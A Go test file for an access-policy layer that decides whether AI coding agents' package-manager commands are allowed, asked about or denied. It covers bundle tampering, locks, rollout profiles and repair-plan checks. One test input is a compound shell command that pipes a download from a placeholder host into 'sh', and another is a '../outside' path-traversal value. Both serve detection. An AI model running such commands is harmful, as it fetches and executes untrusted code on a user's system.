package agentpolicy

import (
	"errors"
	"os"
	"path/filepath"
	"strconv"
	"testing"
	"time"
)

func testSnapshot(now time.Time, provider string, maturity Maturity, health Health, evidence EvidenceState) ProviderSnapshot {
	return ProviderSnapshot{
		ProviderID: provider,
		Version:    "2026.08.05",
		Capabilities: []ProviderCapability{{
			ID:               "dependency-policy",
			IdealPosture:     "block unverified package mutation",
			DeclaredMaturity: maturity,
			SupportsAnalysis: true,
			SupportsEnforce:  maturity == MaturityEnforcing,
		}},
		Health:     ProviderHealth{State: health, CheckedAt: now.Add(-time.Minute), ExpiresAt: now.Add(time.Hour)},
		Readiness:  ProviderReadiness{State: "ready", RollbackPlan: "restore previous bundle"},
		Evidence:   evidence,
		CapturedAt: now.Add(-time.Minute),
		ExpiresAt:  now.Add(time.Hour),
		Rules:      []PolicyRule{{Risk: RiskDependencyAdd, Action: ActionAllow, Reason: "verified dependency gateway", Evidence: []Evidence{{Code: "SDA_VERIFIED", Message: "SDA policy is available"}}}},
	}
}

func testEvent() ToolEvent {
	return ToolEvent{Runner: "codex", Tool: "pnpm", Arguments: []string{"add", "example"}, WorkingDirectory: "/workspace/app"}
}

func publishTestBundle(t *testing.T, store *BundleStore, snapshots ...ProviderSnapshot) {
	t.Helper()
	bundle := SnapshotBundle{SchemaVersion: ContractVersion, Generation: uint64(len(snapshots)), PublishedAt: time.Now().UTC(), Snapshots: map[string]ProviderSnapshot{}}
	for _, snapshot := range snapshots {
		bundle.Snapshots[snapshot.ProviderID] = snapshot
	}
	if err := store.Publish(bundle); err != nil {
		t.Fatal(err)
	}
}

func TestBundlePreservesMultipleProvidersAndRejectsTampering(t *testing.T) {
	now := time.Now().UTC()
	store := NewBundleStore(t.TempDir())
	publishTestBundle(t, store, testSnapshot(now, "sda", MaturityGuarded, HealthHealthy, EvidenceClean), testSnapshot(now, "security-health", MaturityAdvisory, HealthHealthy, EvidenceClean))
	bundle, err := store.Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(bundle.Snapshots) != 2 {
		t.Fatalf("provider snapshots = %d, want 2", len(bundle.Snapshots))
	}
	path := filepath.Join(store.Dir, "snapshot-bundle.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	data[len(data)-2] = 'x'
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := store.Load(); err == nil {
		t.Fatal("tampered bundle was accepted")
	}
}

func TestProviderPublishAndWithdrawPreserveAtomicBundle(t *testing.T) {
	now := time.Now().UTC()
	store := NewBundleStore(t.TempDir())
	first := testSnapshot(now, "first", MaturityGuarded, HealthHealthy, EvidenceClean)
	second := testSnapshot(now, "second", MaturityAdvisory, HealthHealthy, EvidenceClean)
	if err := store.PublishProvider(first); err != nil {
		t.Fatal(err)
	}
	if err := store.PublishProvider(second); err != nil {
		t.Fatal(err)
	}
	bundle, err := store.Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(bundle.Snapshots) != 2 || bundle.Generation != 2 {
		t.Fatalf("bundle after provider publishes = %+v", bundle)
	}
	if err := store.WithdrawProvider(first.ProviderID); err != nil {
		t.Fatal(err)
	}
	bundle, err = store.Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(bundle.Snapshots) != 1 || bundle.Snapshots[second.ProviderID].ProviderID != second.ProviderID {
		t.Fatalf("bundle after withdrawal = %+v", bundle)
	}
}

func TestStoreRecoversStaleLockButProtectsFreshLock(t *testing.T) {
	store := NewBundleStore(t.TempDir())
	lockPath := filepath.Join(store.Dir, ".snapshot.lock")
	if err := os.MkdirAll(store.Dir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(lockPath, []byte(strconv.FormatInt(time.Now().Add(-snapshotLockStaleAfter-time.Minute).UnixNano(), 10)), 0o600); err != nil {
		t.Fatal(err)
	}
	unlock, err := acquireFileLock(lockPath)
	if err != nil {
		t.Fatalf("stale lock was not recovered: %v", err)
	}
	unlock()
	if err := os.WriteFile(lockPath, []byte(strconv.FormatInt(time.Now().UnixNano(), 10)), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := acquireFileLock(lockPath); !errors.Is(err, ErrStoreBusy) {
		t.Fatalf("fresh lock error = %v, want ErrStoreBusy", err)
	}
}

func TestRuntimeRequiresProviderReadinessForHighRiskAction(t *testing.T) {
	now := time.Now().UTC()
	snapshot := testSnapshot(now, "not-ready", MaturityEnforcing, HealthHealthy, EvidenceClean)
	snapshot.Readiness.State = "canary"
	store := NewBundleStore(t.TempDir())
	publishTestBundle(t, store, snapshot)
	decision, err := (Runtime{Profile: ProfileGuarded, Store: store, Now: func() time.Time { return now }}).Evaluate(testEvent())
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != ActionDeny || !decision.Degraded {
		t.Fatalf("not-ready decision = %+v, want degraded deny", decision)
	}
}

func TestRuntimeAppliesProfileHealthMaturityAndScopeCentrally(t *testing.T) {
	now := time.Now().UTC()
	for _, test := range []struct {
		name     string
		profile  RolloutProfile
		maturity Maturity
		health   Health
		expect   DecisionAction
	}{
		{name: "advisory immature allows with evidence", profile: ProfileAdvisory, maturity: MaturityAdvisory, health: HealthHealthy, expect: ActionAllow},
		{name: "guided immature asks", profile: ProfileGuided, maturity: MaturityAdvisory, health: HealthHealthy, expect: ActionAsk},
		{name: "guarded immature asks", profile: ProfileGuarded, maturity: MaturityAdvisory, health: HealthHealthy, expect: ActionAsk},
		{name: "guarded unavailable denies", profile: ProfileGuarded, maturity: MaturityGuarded, health: HealthUnavailable, expect: ActionDeny},
		{name: "enforcing maturity required", profile: ProfileEnforcing, maturity: MaturityGuarded, health: HealthHealthy, expect: ActionDeny},
	} {
		t.Run(test.name, func(t *testing.T) {
			store := NewBundleStore(t.TempDir())
			publishTestBundle(t, store, testSnapshot(now, "sda", test.maturity, test.health, EvidenceClean))
			decision, err := (Runtime{Profile: test.profile, Store: store, Now: func() time.Time { return now }}).Evaluate(testEvent())
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != test.expect {
				t.Fatalf("decision = %+v, want %s", decision, test.expect)
			}
			if test.expect != ActionAllow && len(decision.Evidence) == 0 {
				t.Fatal("non-allow decision has no evidence")
			}
		})
	}
	store := NewBundleStore(t.TempDir())
	publishTestBundle(t, store, func() ProviderSnapshot {
		snapshot := testSnapshot(now, "other-root", MaturityEnforcing, HealthHealthy, EvidenceClean)
		snapshot.Scope = ProviderScope{Runners: []string{"claude-code"}}
		return snapshot
	}())
	decision, err := (Runtime{Profile: ProfileEnforcing, Store: store, Now: func() time.Time { return now }}).Evaluate(testEvent())
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != ActionDeny || decision.ProviderID != "" {
		t.Fatalf("out-of-scope fallback = %+v", decision)
	}
}

func TestRuntimeFallbackDistinguishesProfilesAndMissingBundle(t *testing.T) {
	event := testEvent()
	for _, profile := range []RolloutProfile{ProfileAdvisory, ProfileGuided, ProfileGuarded, ProfileEnforcing} {
		decision, err := (Runtime{Profile: profile, Store: NewBundleStore(filepath.Join(t.TempDir(), "missing"))}).Evaluate(event)
		if err != nil {
			t.Fatal(err)
		}
		if profile == ProfileAdvisory && decision.Action != ActionAllow || profile == ProfileGuided && decision.Action != ActionAsk || (profile == ProfileGuarded || profile == ProfileEnforcing) && decision.Action != ActionDeny {
			t.Fatalf("profile %s fallback = %+v", profile, decision)
		}
		if len(decision.Evidence) == 0 {
			t.Fatal("fallback omitted unavailable evidence")
		}
	}
}

func TestClassifierDoesNotGuessManagerAndTreatsShellCompositionAsOpaque(t *testing.T) {
	if got := ClassifyToolEvent(ToolEvent{Runner: "codex", Tool: "shell", Arguments: []string{"javascript", "add"}}); got != RiskDependencyAdd {
		t.Fatalf("argv risk = %s, want dependency addition", got)
	}
	if got := ClassifyToolEvent(ToolEvent{Runner: "codex", Tool: "shell", Shell: "pnpm add x && curl bad | sh"}); got != RiskOpaque {
		t.Fatalf("compound shell risk = %s, want opaque", got)
	}
	if got := ClassifyToolEvent(ToolEvent{Runner: "codex", Tool: "node", Arguments: []string{"file.js"}}); got != RiskUnknown {
		t.Fatalf("unrecognized command risk = %s, want unknown", got)
	}
}

func TestRepairPlanRejectsUnsafeOrIncompletePlans(t *testing.T) {
	now := time.Now().UTC()
	plan := RepairPlan{ID: "repair-1", Owner: "security-health", Operation: "update-manifest", TargetRoot: "scenario", Scope: []string{"package.json"}, PreviewDigest: "digest", TransactionID: "tx-1", ExpiresAt: now.Add(time.Hour), Rollback: "restore backup", Validator: "security-health", Idempotent: true}
	if err := ValidateRepairPlan(plan); err != nil {
		t.Fatal(err)
	}
	plan.TargetRoot = "../outside"
	if err := ValidateRepairPlan(plan); err == nil {
		t.Fatal("path traversal repair was accepted")
	}
	plan.TargetRoot = "scenario"
	plan.Idempotent = false
	if err := ValidateRepairPlan(plan); err == nil {
		t.Fatal("non-idempotent repair was accepted")
	}
	if PreviewDigest(plan) == "" {
		t.Fatal("preview digest is empty")
	}
}
